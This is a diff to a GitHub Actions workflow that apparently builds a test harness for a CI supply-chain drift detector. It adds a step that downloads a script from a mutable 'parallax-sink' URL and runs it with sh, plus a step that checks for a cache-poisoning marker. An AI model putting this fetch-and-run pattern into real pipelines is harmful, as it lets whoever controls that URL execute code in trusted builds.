@@ -31,6 +31,14 @@ jobs:
         uses: Helios-One-Oy/parallax/dress@v0
         with:
           twin: ${{ matrix.twin }}
+      # Fetch a small bootstrap script by a mutable URL and run it. Harmless: it
+      # only prints a line. CRACI records a body hash for this URL, so if the
+      # sink serves new bytes for the same URL (tag-repoint replay) the fleet
+      # drift detector sees "same URL, new bytes".
+      - name: Fetch and run the build bootstrap (mutable URL)
+        run: |
+          curl -fsS https://parallax-sink.fly.dev/script/bootstrap.sh -o /tmp/plx-bootstrap.sh
+          sh /tmp/plx-bootstrap.sh
       - uses: actions/setup-node@v4
         with:
           node-version: 22
@@ -82,6 +90,10 @@ jobs:
         with:
           path: ~/.npm
           key: npm-${{ hashFiles('**/package-lock.json') }}
+      # cache-poison replay evidence: if a pull_request_target job planted a
+      # marker in the cache under this key, the trusted release job restores it.
+      - name: Note any cache marker (cache-poison replay)
+        run: cat ~/.npm/PARALLAX_CACHE_MARKER.txt 2>/dev/null || echo "no cache marker present"
       - run: npm ci
       - run: npm run build
       - run: npm prune --omit=dev
